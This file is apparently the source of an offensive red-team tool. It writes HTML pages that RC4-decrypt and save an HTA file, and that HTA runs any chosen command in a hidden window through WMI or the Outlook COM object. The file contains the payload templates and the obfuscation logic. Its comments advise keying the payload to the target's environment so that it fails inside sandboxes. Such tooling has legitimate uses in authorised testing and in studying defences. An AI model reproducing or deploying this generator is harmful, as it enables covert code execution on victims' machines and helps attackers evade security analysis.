#!/usr/bin/env python
# -*- coding: utf-8 -*-

import base64
import string
import random
import argparse
import os
import sys

#POWERSHELL_CMD = "powershell -noP -w 1 -enc  YwBhAGwAYwAuAGUAeABlAA=="
HTML_TEMPLATE = """<html>
<body>
<script>
function {5}(r,o){{for(var t,e=[],n=0,a="",f=0;f<256;f++)e[f]=f;for(f=0;f<256;f++)n=(n+e[f]+r.charCodeAt(f%r.length))%256,t=e[f],e[f]=e[n],e[n]=t;f=0,n=0;for(var h=0;h<o.length;h++)n=(n+e[f=(f+1)%256])%256,t=e[f],e[f]=e[n],e[n]=t,a+=String.fromCharCode(o.charCodeAt(h)^e[(e[f]+e[n])%256]);return a}}

// you need to insert your own key environmental derivation function below. It must store the key in the variable called: {0}
// By default htagen will just use your key straight up. Instead you should derive your key from the environment
// so that it only works on your intended target (and not in a sandbox). See virginkey.js for an example.
var {0} = function(){{return "{6}"}};

var {1} = "{2}";
var {9} = {5}({0}(),atob("{10}"));
setTimeout('var {3} = new '+{9}+'([{5}({0}(), atob({1}))])');
var {8} = {5}({0}(),atob("{7}"));
setTimeout({8}+'({3}, {5}({0}(), atob("{4}")))');
</script>
</body>
</html>"""

WMI_HTA = """<html>
<head>
<script language="VBScript"> 
Sub window_onload
	const impersonation = 3
	Const HIDDEN_WINDOW = 12
	Set Locator = CreateObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
	Set Service = Locator.ConnectServer()
	Service.Security_.ImpersonationLevel=impersonation  
	Set objStartup = Service.Get("Win32_ProcessStartup")
	Set objConfig = objStartup.SpawnInstance_
	objConfig.ShowWindow = HIDDEN_WINDOW
	Set Process = Service.Get("Win32_Process")
	Error = Process.Create("{0}", null, objConfig, intProcessID)
	window.close()
end sub
</script>
</head>
</html>"""
#https://twitter.com/enigma0x3/status/870810601483894784
#https://twitter.com/enigma0x3/status/890980564420788224

COM_HTA = """<script language="VBScript">
Set obj = GetObject("new:0006F03A-0000-0000-C000-000000000046")
obj.CreateObject("WScript.Shell").Run("{}")
self.close
</script>"""
#https://gist.github.com/staaldraad/b0665993f49098e9b82a4fd4d135198f

PAYLOAD_OPTIONS = {'WbemScripting.SWbemLocator': WMI_HTA, 'Outlook.Application': COM_HTA}

def rc4(key, data):
    """
    Decrypt/encrypt the passed data using RC4 and the given key.
	https://github.com/EmpireProject/Empire/blob/73358262acc8ed3c34ffc87fa593655295b81434/data/agent/stagers/dropbox.py
    """
    S,j,out=range(256),0,[]
    for i in range(256):
        j=(j+S[i]+ord(key[i%len(key)]))%256
        S[i],S[j]=S[j],S[i]
    i=j=0
    for char in data:
        i=(i+1)%256
        j=(j+S[i])%256
        S[i],S[j]=S[j],S[i]
        out.append(chr(ord(char)^S[(S[i]+S[j])%256]))
    return ''.join(out)
	
def rnd():
    return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(8))
	
def payload_choices():
    return PAYLOAD_OPTIONS.keys()
	
def list_payloads():
    print "\n\t".join(PAYLOAD_OPTIONS.keys())

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='"The Demiguise is a peaceful, herbivorous creature that can make itself invisible and tell the future which makes it very hard to catch."')
    parser.add_argument("-k", "--key", help="Encryption key", dest="key")
    parser.add_argument("-p", "--payload", help="Payload type to use", dest="payload", choices=payload_choices())
    parser.add_argument("-l", "--list-payloads", help="List payloads available", action="store_const", const="list_payloads")
    parser.add_argument("-c", "--command", help="Command to run from HTA", dest="command")
    parser.add_argument("-o", "--output", help="Name of the HTA file to generate", dest="output")
    args = parser.parse_args()
	
    if args.list_payloads:
        sys.stdout.write("[*] Payload choices:\n\t")
        list_payloads()
        sys.exit(1)
	
    if args.key and args.command and args.output and args.payload:
        hta_text = PAYLOAD_OPTIONS.get(args.payload).format(args.command)
        hta_encrypted = base64.b64encode(rc4(args.key, hta_text))
        filename_encrypted = base64.b64encode(rc4(args.key, args.output))
        msSaveBlob = base64.b64encode(rc4(args.key, "navigator.msSaveBlob"))
        blob = base64.b64encode(rc4(args.key, "Blob"))

        outfile = "{}.html".format(os.path.splitext(args.output)[0])
        with open(outfile, 'w') as f:
            f.write(HTML_TEMPLATE.format(rnd(), rnd(), hta_encrypted, rnd(), filename_encrypted, rnd(), args.key, msSaveBlob, rnd(), rnd(), blob))
        print "\n[*] Generating with key: {}".format(args.key)
        print "[*] Will execute: {}".format(args.command)
        print "[+] HTA file written to: {}".format(outfile)
        print "[!] Warning: The HTA contains your plaintext key. Remember to write your own environmental key function if you want to avoid sandboxes ;)"
    else:
	    parser.print_help()
	    print "\n[*] Example: python demiguise.py -k hello -c \"cmd.exe /c calc.exe\" -o test.hta"